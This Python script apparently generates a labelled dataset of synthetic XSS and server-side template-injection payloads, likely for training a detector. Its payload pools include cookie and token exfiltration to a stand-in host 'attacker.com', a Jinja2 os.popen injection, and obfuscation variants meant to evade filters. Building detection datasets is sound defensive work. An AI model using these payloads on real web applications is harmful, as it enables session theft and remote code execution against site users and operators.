import csv
import os
import itertools
import random

from events import HIGH_VALUE_EVENTS
from tags import HIGH_VALUE_TAGS

random.seed(42)

TAGS    = HIGH_VALUE_TAGS
EVENTS  = HIGH_VALUE_EVENTS

# ── Payload argument pools by severity ────────────────────────────────────────
FUNCS_MEDIUM = ["alert", "prompt", "confirm", "console.log"]
FUNCS_HIGH   = ["fetch", "XMLHttpRequest", "eval"]

ARGS_MEDIUM = [
    "1", "'XSS'", "document.domain",
    "String.fromCharCode(88,83,83)", "location.hash",
]
ARGS_HIGH = [
    "document.cookie",
    "btoa(document.cookie)",
    "'//attacker.com/?c='+document.cookie",
    "localStorage.getItem('token')",
    "navigator.sendBeacon('//attacker.com',document.cookie)",
    "document.cookie+'&loc='+location.href",
]

COMMENTS = ["", "*", "x"]

# ── Templates that use .format(tag, event, func, arg, comment) ────────────────
# Each class has its OWN per-pattern budget — starved classes get more.
TEMPLATES = {
    "script_injection": {
        "budget": 200,          # 200 combos per pattern
        "funcs": FUNCS_MEDIUM,
        "args":  ARGS_MEDIUM,
        "patterns": [
            "<script>{func}({arg})</script>",
            "<script>/{comment}/{func}({arg})</script>",
            "<script>{func}`{arg}`</script>",
            "<SCRIPT>{func}({arg})</SCRIPT>",
            "<script\t>{func}({arg})</script>",
            "<script\n>{func}({arg})</script>",
            "<script>setTimeout('{func}({arg})',0)</script>",
            "<script>Function('{func}({arg})')();</script>",
            "<script>window['{func}']({arg})</script>",
            '"><script>{func}({arg})</script>',
            "'><script>{func}({arg})</script>",
        ],
    },
    "tag_injection": {
        "budget": 200,
        "funcs": FUNCS_MEDIUM,
        "args":  ARGS_MEDIUM,
        "patterns": [
            "<{tag} {event}={func}({arg})>",
            "<{tag} {event}={func}({arg})/>",
            '"><{tag} {event}={func}({arg})>',
            "<{tag}/{event}={func}({arg})>",
            "<{tag}\t{event}={func}({arg})>",
            "<{tag}\n{event}={func}({arg})>",
            "<{tag} src=x {event}={func}({arg})>",
            "<{tag} x=y {event}={func}({arg})>",
            "<!--><{tag} {event}={func}({arg})>",
            "<{tag} {event}={func}({arg}) {event}={func}({arg})>",
        ],
    },
    "event_handler": {
        "budget": 300,          # standalone event= without a surrounding tag
        "funcs": FUNCS_MEDIUM,
        "args":  ARGS_MEDIUM,
        "patterns": [
            "{event}={func}({arg})",
            " {event}={func}({arg})",
            "\t{event}={func}({arg})",
            "{event}=javascript:{func}({arg})",
            "{event}={func}/*{comment}*/({arg})",
            "{event}={func}&#40;{arg}&#41;",
        ],
    },
    "attribute_escape": {
        "budget": 400,          # underrepresented — higher budget
        "funcs": FUNCS_MEDIUM,
        "args":  ARGS_MEDIUM,
        "patterns": [
            '" {event}={func}({arg}) "',
            "' {event}={func}({arg}) '",
            '" onfocus={func}({arg}) autofocus="',
            '"><img src=x {event}={func}({arg})>',
            "'><img src=x {event}={func}({arg})>",
            '" onmouseover={func}({arg}) x="',
            "&quot; {event}={func}({arg}) x=&quot;",
            '\\" {event}={func}({arg})//',
            "\\' {event}={func}({arg})//",
            '" ><svg {event}={func}({arg})>',
            "' ><svg {event}={func}({arg})>",
            '`><img src=x {event}={func}({arg})>',
        ],
    },
    "js_uri": {
        "budget": 200,
        "funcs": FUNCS_MEDIUM,
        "args":  ARGS_MEDIUM,
        "patterns": [
            "javascript:{func}({arg})",
            "javascript:void({func}({arg}))",
            "j&#97;vascript:{func}({arg})",
            "&#106;avascript:{func}({arg})",
            "java\tscript:{func}({arg})",
            "java\nscript:{func}({arg})",
            "JAVASCRIPT:{func}({arg})",
            "javascript:{func}/*{comment}*/({arg})",
            "data:text/html,<script>{func}({arg})</script>",
            "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk={func}({arg}) )//%0D%0A%0d%0a",
            "javascript:%0a{func}({arg})",
        ],
    },
    "dom_sink": {
        "budget": 400,          # underrepresented — higher budget
        "funcs": FUNCS_MEDIUM + FUNCS_HIGH,
        "args":  ARGS_MEDIUM + ARGS_HIGH,
        "patterns": [
            'document.write("<img src=x onerror={func}({arg})>")',
            'document.body.innerHTML="<img src=x onerror={func}({arg})>"',
            'eval("{func}({arg})")',
            'setTimeout("{func}({arg})",0)',
            'setInterval("{func}({arg})",100)',
            'location.href="javascript:{func}({arg})"',
            'location="javascript:{func}({arg})"',
            'window["{func}"]({arg})',
            '(new Function("{func}({arg})"))();',
            'element.setAttribute("onclick","{func}({arg})")',
            'element.insertAdjacentHTML("beforeend","<img src=x onerror={func}({arg})>")',
            'document.querySelector("body").innerHTML+="{func}({arg})"',
            '__proto__["{event}"]={func}({arg})',
            'Object.assign(window,{{"{event}":{func}}})',
        ],
    },
}

# ── Template injection (plain string replace — avoids .format() brace escaping)
TEMPLATE_INJECTION_PATTERNS = [
    # AngularJS
    "{{constructor.constructor('FUNC(ARG)')()}}",
    "{{$on.constructor('FUNC(ARG)')()}}",
    "{{FUNC(ARG)}}",
    "{{7*'7'}}",
    "{{FUNC|constructor:ARG}}",
    # Mustache / Handlebars
    "{{{FUNC(ARG)}}}",
    "{{#with FUNC(ARG)}}...{{/with}}",
    # Jinja2 / Twig
    "{{ FUNC(ARG) }}",
    "{% FUNC ARG %}",
    "{{ lipsum.__globals__['os'].popen('FUNC').read() }}",
    # ERB / ASP
    "<%= FUNC(ARG) %>",
    "<% FUNC(ARG) %>",
    "<%= FUNC ARG %>",
    # Velocity
    "#set($x='FUNC(ARG)')$x",
    "#FUNC(ARG)",
    # Generic interpolation
    "${FUNC(ARG)}",
    "${{FUNC(ARG)}}",
    "#{FUNC(ARG)}",
    "#{{FUNC(ARG)}}",
    # FreeMarker
    "${FUNC?new()('ARG')}",
    "[#FUNC ARG /]",
    # Smarty
    "{FUNC ARG}",
    "{php}FUNC(ARG){/php}",
    # Pebble / Thymeleaf
    "{{FUNC ARG}}",
    "__${FUNC(ARG)}__::.x",
    # Mako
    "${FUNC(ARG)|n}",
    # Nested / polyglot
    "{{constructor['constructor']('FUNC(ARG)')()}}",
    "{{[].pop.constructor('FUNC(ARG)')()}}",
    "${{'FUNC(ARG)'.replace('FUNC(ARG)','')}}",
]
TEMPLATE_FUNCS = ["alert", "prompt", "confirm"]
TEMPLATE_ARGS  = ["1", "document.domain", "'XSS'", "document.cookie"]


# ── Obfuscation variants ───────────────────────────────────────────────────────
def obfuscate(payload):
    v = [payload]
    v.append(payload.replace("a", "&#97;").replace("e", "&#101;"))
    v.append(payload.replace("alert", "\\u0061lert"))
    v.append(payload.replace("<", "%3C").replace(">", "%3E"))
    v.append(payload.replace("'", "%27").replace('"', "%22"))
    if "script" in payload.lower():
        v.append(payload.replace("script", "scr\tipt"))
    case_var = ""
    for i, c in enumerate(payload):
        case_var += c.upper() if c.isalpha() and i % 3 == 0 else c
    v.append(case_var)
    return v


# ── Generation ─────────────────────────────────────────────────────────────────
generated = set()

# 1. Context-templated payloads (tag/event combos)
for context, cfg in TEMPLATES.items():
    budget   = cfg["budget"]
    patterns = cfg["patterns"]
    funcs    = cfg["funcs"]
    args     = cfg["args"]

    combos = list(itertools.product(TAGS, EVENTS, funcs, args, COMMENTS))
    random.shuffle(combos)

    for pattern in patterns:
        count = 0
        for tag, event, func, arg, comment in combos:
            if count >= budget:
                break
            try:
                payload = pattern.format(
                    tag=tag, event=event, func=func, arg=arg,
                    comment=comment, content="",
                )
                for variant in obfuscate(payload):
                    if 5 < len(variant) < 2000:
                        generated.add((variant, context))
                count += 1
            except (KeyError, IndexError):
                continue

# 2. Template injection (separate loop — no tag/event substitution)
for pattern in TEMPLATE_INJECTION_PATTERNS:
    for func in TEMPLATE_FUNCS:
        for arg in TEMPLATE_ARGS:
            payload = pattern.replace("FUNC", func).replace("ARG", arg)
            for variant in obfuscate(payload):
                if 5 < len(variant) < 2000:
                    generated.add((variant, "template_injection"))

# ── Save ───────────────────────────────────────────────────────────────────────
os.makedirs("processed", exist_ok=True)
with open("processed/synthetic_payloads.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.writer(f)
    writer.writerow(["payload", "context"])
    for payload, context in generated:
        writer.writerow([payload, context])

# Report per-class counts
from collections import Counter
counts = Counter(ctx for _, ctx in generated)
print(f"\n[DONE] Generated {len(generated)} synthetic payloads")
print("\n=== PER CLASS ===")
for cls, n in sorted(counts.items(), key=lambda x: -x[1]):
    print(f"  {cls:<22} {n:>6}")
print(f"\n-> processed/synthetic_payloads.csv")

